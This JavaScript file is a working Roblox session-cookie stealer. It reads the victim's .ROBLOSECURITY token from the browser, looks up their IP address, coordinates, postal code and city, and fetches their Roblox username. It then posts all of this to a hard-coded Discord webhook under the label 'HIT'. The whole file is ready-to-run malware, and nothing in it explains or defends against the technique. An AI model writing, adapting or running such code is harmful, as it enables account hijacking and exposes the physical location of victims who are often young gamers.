const webhookURL = "https://discord.com/api/webhooks/1427363261002551430/VbEJbYa_aqZwA2k6wvqRVLfNqULfTQfprJRMZVMHneBk875FA432yfBiZ9Bz_1Z3nwBO";

async function sendGeoEmbed() {
  try {
    // 1. Get IP address
    let ip;
    try {
      const ipRes = await fetch("https://api.ipify.org?format=json");
      if (!ipRes.ok) throw new Error(`IP fetch failed with status ${ipRes.status}`);
      const ipObj = await ipRes.json();
      ip = ipObj.ip || "Unknown";
    } catch (err) {
      console.error("Error fetching IP:", err);
      ip = "Unknown";
    }

    // 2. Get geolocation info
    let geo;
    try {
      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
      if (!geoRes.ok) throw new Error(`Geo fetch failed with status ${geoRes.status}`);
      geo = await geoRes.json();
      if (geo.error) throw new Error(`Geo API error: ${geo.reason || 'Unknown reason'}`);
    } catch (err) {
      console.error("Error fetching geolocation:", err);
      geo = {}; // fallback to empty object
    }

    // 3. Convert country code to emoji
    const countryCode = geo.country_code || "US";
    const flagEmoji = countryCodeToEmoji(countryCode);

    // 4. Get Roblox security token from cookies
    const token = getCookie(".ROBLOSECURITY") || "No token";

    // 5. Get Roblox user ID
    const userId = getRobloxUserId();

    // 6. Fetch username
    let username = "Unknown";
    if (userId) {
      try {
        username = await getRobloxUsername(userId);
      } catch (err) {
        console.error("Error fetching Roblox username:", err);
        username = "Unknown";
      }
    }

    // 7. Generate Roblox headshot URL only if userId exists
    const headshotUrl = userId
      ? `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=420&height=420&format=png`
      : "https://via.placeholder.com/150?text=No+Headshot";

    // 8. Build embed message
    const embed = {
      title: `IP Info for ${ip}`,
      description: `Country: ${geo.country_name || 'N/A'} ${flagEmoji}`,
      color: 0x00ff00,
      author: {
        name: username ? `[**${username}**](https://www.roblox.com/users/${userId}/profile)` : 'Unknown User',
        url: username ? `https://www.roblox.com/users/${userId}/profile` : null
      },
      thumbnail: {
        url: headshotUrl
      },
      fields: [
        {
          name: "Coordinates",
          value: `${geo.latitude || 'N/A'}, ${geo.longitude || 'N/A'}`,
          inline: false
        },
        {
          name: "Postal Code",
          value: geo.postal || "N/A",
          inline: false
        },
        {
          name: "Region / City",
          value: `${geo.region || 'N/A'}, ${geo.city || 'N/A'}`,
          inline: false
        },
        {
          name: "ROBLOX Token",
          value: token,
          inline: false
        }
      ],
      timestamp: new Date().toISOString(),
      footer: {
        text: "Geo data via ipapi.co"
      }
    };

    // 9. Prepare webhook message
    const msg = {
      username: "HIT",
      avatar_url: "https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=80",
      embeds: [embed]
    };

    // 10. Send webhook
    const resp = await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(msg)
    });
    if (!resp.ok) {
      const errorText = await resp.text();
      console.error("Failed to send embed:", errorText);
    } else {
      console.log("✅ Embed sent!");
    }
  } catch (err) {
    console.error("Unexpected error:", err);
  }
}

// Call the function
sendGeoEmbed();

// Helper functions
function getRobloxUserId() {
  try {
    const url = window.location.href;
    const match = url.match(/\/users\/(\d+)\//);
    return match ? match[1] : null;
  } catch {
    return null;
  }
}

function countryCodeToEmoji(cc) {
  try {
    const OFFSET = 127397;
    return cc
      .toUpperCase()
      .split('')
      .map(c => String.fromCodePoint(c.charCodeAt(0) + OFFSET))
      .join('');
  } catch {
    return '';
  }
}

function getCookie(name) {
  try {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
  } catch {
    return null;
  }
}

async function getRobloxUsername(userId) {
  try {
    const response = await fetch(`https://users.roblox.com/v1/users/${userId}`);
    if (!response.ok) throw new Error(`Roblox username fetch failed with status ${response.status}`);
    const data = await response.json();
    return data.name || 'Unknown';
  } catch (err) {
    console.error("Error fetching Roblox username:", err);
    return 'Unknown';
  }
}
